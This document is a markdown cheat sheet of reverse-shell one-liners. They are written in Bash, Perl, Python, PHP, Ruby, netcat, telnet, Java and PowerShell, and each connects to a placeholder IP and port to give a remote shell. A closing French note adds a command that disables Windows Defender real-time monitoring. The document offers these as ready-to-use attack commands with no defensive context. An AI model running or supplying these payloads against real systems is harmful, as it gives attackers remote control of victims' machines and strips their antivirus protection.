# One Liner

## Bash

```bash
bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
```

```bash
exec 5<>/dev/tcp/<IP>/<PORT>;cat <&5 | while read line; do $line 2>&5 >&5; done
```

```bash
exec /bin/sh 0</dev/tcp/<IP>/<PORT> 1>&0 2>&0
```

```bash
0<&196;exec 196<>/dev/tcp/<IP>/<PORT>; sh <&196 >&196 2>&196
```

## Perl

```bash
perl -e 'use Socket;$i="<IP>";$p=<PORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

## Python

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

## Php

```bash
php -r '$s=fsockopen("<IP>",<PORT>);exec("/bin/sh -i <&3 >&3 2>&3");
```

```bash
php -r '$s=fsockopen("<IP>",<PORT>);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
```

```bash
php -r '$s=fsockopen("<IP>",<PORT>);`/bin/sh -i <&3 >&3 2>&3`;'
```

```bash
php -r '$s=fsockopen("<IP>",<PORT>);system("/bin/sh -i <&3 >&3 2>&3");'
```

```bash
php -r '$s=fsockopen("<IP>",<PORT>);popen("/bin/sh -i <&3 >&3 2>&3", "r");'
```

## Ruby

```bash
ruby -rsocket -e'f=TCPSocket.open("<IP>",<PORT>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

```bash
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("<IP>","<PORT>");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

```bash
ruby -rsocket -e "c=TCPSocket.new('<IP>','<PORT>');while(cmd=c.gets);IO.popen(cmd,'r'){|io|c.print io.read}end"
```

## Netcat

```bash
nc <IP> <PORT> -e /bin/bash
```

```bash
rm f;mkfifo f;cat f|/bin/sh -i 2>&1|nc <IP> <PORT> > f
```

## Telnet

```bash
rm f;mkfifo f;cat f|/bin/sh -i 2>&1|telnet <IP> <PORT> > f
```

## Java

```bash
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<IP>/<PORT>;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

## Powershell

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('$ip',$port);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

Désactiver AV (si droits suffisants):

Set-MpPreference -DisableRealtimeMonitoring $true
```
